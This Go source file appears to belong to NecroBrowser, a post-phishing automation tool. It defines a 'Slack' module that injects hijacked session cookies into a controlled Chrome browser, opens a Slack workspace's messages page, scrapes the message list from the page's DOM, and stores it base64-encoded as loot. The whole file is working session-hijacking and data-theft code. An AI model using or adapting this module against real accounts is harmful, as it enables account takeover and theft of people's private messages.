package slack

import (
	"context"
	"encoding/base64"

	"github.com/muraenateam/necrobrowser/action"
	"github.com/muraenateam/necrobrowser/log"

	"github.com/muraenateam/necrobrowser/action/cookie"
	"github.com/muraenateam/necrobrowser/action/dom"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "Slack"
)

type Slack struct {
	zombie.Target

	URL string
}

type Extrusion struct {
	zombie.Extrusion

	Messages string
}

func NewSlack(target zombie.Target) *Slack {

	target.Tag = zombie.GetTag(Name)
	return &Slack{
		Target: target,
		URL:    "https://phrackdotorg.slack.com/messages",
	}
}

// Name returns the action name
func (z *Slack) Name() string {
	return Name
}

// SetTarget updates the zombie target object
func (z *Slack) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *Slack) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *Slack) Instrument() (interface{}, error) {

	var (
		ext Extrusion
		err error
	)

	z.Debug("Instrumenting")
	a := action.Action{Target: z.Target}

	// Set session Cookies
	c := &cookie.Cookie{Action: a}
	if err = c.SetSessionCookies(); err != nil {
		log.Error("Error setting session cookies: %v", err)
		return nil, err
	}

	var html string
	d := &dom.DOM{
		Action:   a,
		URL:      z.URL,
		Selector: `#messages_container > div.p-history_container.message_pane_scroller > div > div:nth-child(2) > div > div.c-virtual_list.c-virtual_list--scrollbar.c-message_list.c-scrollbar.c-scrollbar--fade`,
	}
	if err = d.DumpSelector(&html); err != nil {
		log.Error("Error retrieving DOM elements: %v", err)
		return nil, err
	}

	ext.Messages = base64.StdEncoding.EncodeToString([]byte(html))
	log.Info("Messages page: \n%s", html)

	return ext, nil
}
